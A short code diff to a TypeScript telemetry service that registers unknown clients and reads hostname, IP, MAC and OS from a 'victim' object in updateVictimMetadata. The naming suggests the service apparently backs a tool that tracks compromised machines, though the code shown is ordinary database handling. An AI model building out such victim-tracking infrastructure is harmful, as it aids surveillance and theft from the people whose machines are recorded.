@@ -334,6 +334,22 @@ export class TelemetryService {
     try {
       await db.connect();
       console.log('✅ Database connected for saveTelemetryLog');
+
+      // Проверяем существование клиента в telemetry_clients
+      const clientCheck = await db.query(
+        `SELECT id FROM telemetry_clients WHERE id = $1`,
+        [clientId],
+      );
+
+      if (clientCheck.rows.length === 0) {
+        console.log('⚠️ Client not found, creating entry...');
+        await db.query(
+          `INSERT INTO telemetry_clients (id, first_seen, last_seen, is_active)
+           VALUES ($1, NOW(), NOW(), true)
+           ON CONFLICT (id) DO NOTHING`,
+          [clientId],
+        );
+      }
       
       let encryptedPayload: Buffer | null = null;
       let payloadSize = 0;
@@ -387,11 +403,11 @@ export class TelemetryService {
       await db.connect();
       console.log('✅ Database connected for updateVictimMetadata');
       
-      // Извлекаем данные из frontend_data
-      const hostname = frontendData.hostname || null;
-      const ip = frontendData.ip || null;
-      const mac = frontendData.mac || null;
-      const os = frontendData.os || null;
+      // Извлекаем данные из frontend_data.victim.*
+      const hostname = frontendData?.victim?.hostname || null;
+      const ip = frontendData?.victim?.ip || null;
+      const mac = frontendData?.victim?.mac || null;
+      const os = frontendData?.victim?.os || null;
 
       console.log('Extracted data:', { hostname, ip, mac, os });
 
